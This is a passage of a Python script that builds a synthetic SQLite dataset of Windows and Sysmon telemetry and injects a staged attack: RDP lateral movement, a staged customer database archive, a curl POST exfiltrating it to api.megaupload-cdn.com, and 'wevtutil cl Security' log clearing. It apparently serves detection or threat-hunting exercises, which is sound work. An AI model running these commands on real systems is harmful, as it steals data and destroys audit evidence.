        # -------------------------------------------------------------------
        t = "2026-10-07T11:30:10Z"
        p_rdp_src = self.next_proc_id()
        raw_rdp_net = {
            "source.ip": dev_ip, "source.port": 55100,
            "destination.ip": exec_ip, "destination.port": 3389,
            "network.protocol": "tcp", "process.name": "mstsc.exe"
        }
        e_rdpn = self.add_event(t, "Sysmon", "3", ["network"], ["connection"], "network_connection",
                                "success", 1, dev_host, dev_name, dev_ip, "u-svc-sql", "svc_sqlreport", "CORP", p_rdp_src, raw_rdp_net)
        self.batch_nets.append((e_rdpn, p_rdp_src, dev_ip, 55100, exec_ip, 3389, "tcp", json.dumps(raw_rdp_net)))

        # 4624 Type 10 (RemoteInteractive) logon on WS-EXEC-15
        t = "2026-10-07T11:30:12Z"
        raw_rdp_logon = {
            "winlog.logon.type": "RemoteInteractive", "winlog.logon.id": "0x7a11f2",
            "source.ip": dev_ip, "winlog.event_data.TargetUserName": "svc_sqlreport",
        }
        self.add_event(t, "Security", "4624", ["authentication"], ["logon"], "logon_success",
                       "success", 1, exec_host, exec_name, exec_ip, "u-svc-sql", "svc_sqlreport", "CORP", self.next_proc_id(), raw_rdp_logon)

        # -------------------------------------------------------------------
        # Stage 6: Data Collection on WS-DBA-03 (12:00:00)
        # SQL export to staged archive
        # -------------------------------------------------------------------
        t = "2026-10-07T12:01:15Z"
        staged_cab = "C:\\Users\\svc_sqlreport\\AppData\\Local\\Temp\\customer_db_export.cab"
        cab_sha = "c4129e01869e54a39b33a7e584102c914e6bba8491823efca4081ef77bcda021"
        raw_cab = {
            "file.path": staged_cab, "file.name": "customer_db_export.cab", "file.extension": ".cab",
            "file.size": 47185920, "file.hash.sha256": cab_sha, "process.name": "powershell.exe"
        }
        e_cab = self.add_event(t, "Sysmon", "11", ["file"], ["creation"], "file_created",
                               "success", 1, dba_host, dba_name, dba_ip, "u-svc-sql", "svc_sqlreport", "CORP", p_dba_ps, raw_cab)
        self.batch_files.append((e_cab, p_dba_ps, staged_cab, "customer_db_export.cab", ".cab", 47185920, cab_sha, json.dumps(raw_cab)))

        # -------------------------------------------------------------------
        # Stage 7: Exfiltration from WS-EXEC-15 (12:30:00)
        # HTTPS POST to api.megaupload-cdn.com
        # -------------------------------------------------------------------
        t = "2026-10-07T12:30:45Z"
        p_curl = self.next_proc_id()
        raw_curl = {
            "process.entity_id": p_curl, "process.name": "curl.exe",
            "process.executable": "C:\\Windows\\System32\\curl.exe",
            "process.command_line": f"curl.exe -X POST https://api.megaupload-cdn.com/upload --data-binary @{staged_cab}",
            "process.pid": 8110, "process.parent.name": "cmd.exe", "process.parent.pid": 7200
        }
        e_curl = self.add_event(t, "Sysmon", "1", ["process"], ["start"], "process_started",
                                "success", 1, exec_host, exec_name, exec_ip, "u-svc-sql", "svc_sqlreport", "CORP", p_curl, raw_curl)
        self.batch_procs.append((p_curl, e_curl, exec_host, 8110, "curl.exe", "C:\\Windows\\System32\\curl.exe", None, 7200, json.dumps(raw_curl)))

        raw_exfil_net = {
            "source.ip": exec_ip, "source.port": 58922,
            "destination.ip": exfil_ip, "destination.port": 443,
            "destination.domain": "api.megaupload-cdn.com",
            "network.protocol": "tcp", "process.name": "curl.exe"
        }
        e_exn = self.add_event(t, "Sysmon", "3", ["network"], ["connection"], "network_connection",
                               "success", 1, exec_host, exec_name, exec_ip, "u-svc-sql", "svc_sqlreport", "CORP", p_curl, raw_exfil_net)
        self.batch_nets.append((e_exn, p_curl, exec_ip, 58922, exfil_ip, 443, "tcp", json.dumps(raw_exfil_net)))

        # -------------------------------------------------------------------
        # Stage 8: Cleanup / Anti-Forensics on WS-DEV-07 (12:45:00)
        # wevtutil cl Security + File deletion
        # -------------------------------------------------------------------
        t = "2026-10-07T12:45:10Z"
        p_wevt = self.next_proc_id()
        raw_wevt = {
            "process.entity_id": p_wevt, "process.name": "wevtutil.exe",
            "process.executable": "C:\\Windows\\System32\\wevtutil.exe",
            "process.command_line": "wevtutil cl Security", "process.pid": 11890,
            "process.parent.entity_id": p_ps_disc, "process.parent.name": "powershell.exe", "process.parent.pid": 9432
        }
        e_wevt = self.add_event(t, "Sysmon", "1", ["process"], ["start"], "process_started",
                                "success", 1, dev_host, dev_name, dev_ip, dev_uid, dev_user, "CORP", p_wevt, raw_wevt)
        self.batch_procs.append((p_wevt, e_wevt, dev_host, 11890, "wevtutil.exe", "C:\\Windows\\System32\\wevtutil.exe", p_ps_disc, 9432, json.dumps(raw_wevt)))

        # Security 1102 The audit log was cleared
        t = "2026-10-07T12:45:11Z"
        raw_1102 = {
            "winlog.event_data.SubjectUserName": dev_user,
            "winlog.event_data.SubjectDomainName": "CORP",
        }
        self.add_event(t, "Security", "1102", ["administrative"], ["clearing"], "log_cleared",
                       "success", 1, dev_host, dev_name, dev_ip, dev_uid, dev_user, "CORP", p_wevt, raw_1102)

        # File deletion of staging cab
        t = "2026-10-07T12:46:00Z"
        raw_del = {
            "file.path": staged_cab, "file.name": "customer_db_export.cab",
            "process.name": "powershell.exe"
        }
        self.add_event(t, "Sysmon", "23", ["file"], ["deletion"], "file_deleted",
                       "success", 1, dba_host, dba_name, dba_ip, "u-svc-sql", "svc_sqlreport", "CORP", p_dba_ps, raw_del)

        self.flush_batches()
        print(f"Attack injection complete. Total events now: {self.event_counter}")


def init_database(db_path: Path) -> sqlite3.Connection:
    if db_path.exists():
        db_path.unlink()
    
    conn = sqlite3.connect(str(db_path))
    cur = conn.cursor()

    cur.execute("""
    CREATE TABLE hosts (
        host_id TEXT PRIMARY KEY,
        host_name TEXT,
        raw_json TEXT
    );
    """)

    cur.execute("""
    CREATE TABLE users (
        user_id TEXT PRIMARY KEY,
        user_name TEXT,
        raw_json TEXT
    );
    """)

    cur.execute("""
    CREATE TABLE events (
        event_id TEXT PRIMARY KEY,
        timestamp TEXT,
        provider TEXT,
        event_code TEXT,
        category TEXT,
        event_type TEXT,
        action TEXT,
        outcome TEXT,
        severity INTEGER,
        host_id TEXT,
        user_id TEXT,
        process_entity_id TEXT,
        raw_json TEXT
    );
    """)

    cur.execute("""
    CREATE TABLE processes (
        process_entity_id TEXT PRIMARY KEY,
        event_id TEXT,
        host_id TEXT,
        pid INTEGER,
        process_name TEXT,
        executable TEXT,
        parent_entity_id TEXT,
        parent_pid INTEGER,
        raw_json TEXT
    );
    """)

    cur.execute("""
    CREATE TABLE network_connections (
        network_id INTEGER PRIMARY KEY AUTOINCREMENT,
        event_id TEXT,
        process_entity_id TEXT,
        source_ip TEXT,
        source_port INTEGER,
        destination_ip TEXT,
        destination_port INTEGER,
        protocol TEXT,
        raw_json TEXT
    );
    """)

    cur.execute("""
    CREATE TABLE files (
        file_id INTEGER PRIMARY KEY AUTOINCREMENT,
        event_id TEXT,
        process_entity_id TEXT,
        file_path TEXT,
        file_name TEXT,
        extension TEXT,
        size INTEGER,
        sha256 TEXT,
        raw_json TEXT
    );
    """)

    cur.execute("""
    CREATE TABLE registry_events (
        registry_id INTEGER PRIMARY KEY AUTOINCREMENT,
        event_id TEXT,
        process_entity_id TEXT,
        registry_path TEXT,
        registry_key TEXT,
        registry_value TEXT,
        value_type TEXT,
        raw_json TEXT
    );
    """)

    conn.commit()
    return conn


def populate_entities(conn: sqlite3.Connection):
    cur = conn.cursor()
    
    host_rows = []
    for hid, hname, os_name, hip, dept in ENTERPRISE_HOSTS:
        raw = {
            "host.id": hid, "host.name": hname, "host.hostname": hname,
            "host.os.name": os_name, "host.os.platform": "windows",
            "host.ip": hip, "department": dept
        }
        host_rows.append((hid, hname, json.dumps(raw)))
    cur.executemany("INSERT INTO hosts VALUES (?,?,?)", host_rows)

    user_rows = []
    for uid, uname, udomain, uroles in USERS:
        raw = {
            "user.id": uid, "user.name": uname, "user.domain": udomain, "user.roles": uroles
        }
        user_rows.append((uid, uname, json.dumps(raw)))
    cur.executemany("INSERT INTO users VALUES (?,?,?)", user_rows)

    conn.commit()


def create_indexes(conn: sqlite3.Connection):
    print("Building database performance indexes...")
    cur = conn.cursor()
    cur.execute("CREATE INDEX idx_events_ts ON events(timestamp);")
    cur.execute("CREATE INDEX idx_events_host ON events(host_id);")
    cur.execute("CREATE INDEX idx_events_proc ON events(process_entity_id);")
    cur.execute("CREATE INDEX idx_events_code ON events(event_code);")
    cur.execute("CREATE INDEX idx_events_action ON events(action);")
    cur.execute("CREATE INDEX idx_procs_proc ON processes(process_entity_id);")
    cur.execute("CREATE INDEX idx_procs_host ON processes(host_id);")
    cur.execute("CREATE INDEX idx_procs_name ON processes(process_name);")
    cur.execute("CREATE INDEX idx_nets_proc ON network_connections(process_entity_id);")
    cur.execute("CREATE INDEX idx_files_proc ON files(process_entity_id);")
    cur.execute("CREATE INDEX idx_regs_proc ON registry_events(process_entity_id);")
    conn.commit()


def main():
    print(f"Creating large enterprise dataset at {DB_PATH}...")
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    conn = init_database(DB_PATH)
    populate_entities(conn)

    generator = EnterpriseTelemetryGenerator(conn)
    generator.generate_noise()
    generator.inject_attack_g()

    create_indexes(conn)

    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM events")
    total_events = cur.fetchone()[0]
    cur.execute("SELECT COUNT(*) FROM hosts")
    total_hosts = cur.fetchone()[0]
    cur.execute("SELECT COUNT(*) FROM users")
    total_users = cur.fetchone()[0]
    cur.execute("SELECT COUNT(*) FROM processes")
    total_procs = cur.fetchone()[0]
    conn.close()

    db_size_mb = DB_PATH.stat().st_size / (1024 * 1024)
    print("\nDataset Generation Complete!")
    print(f"  Database Path: {DB_PATH}")
    print(f"  Total Events:   {total_events:,}")
    print(f"  Total Hosts:    {total_hosts}")
    print(f"  Total Users:    {total_users}")
    print(f"  Total Procs:    {total_procs:,}")
    print(f"  File Size:      {db_size_mb:.2f} MB")


if __name__ == "__main__":
    main()
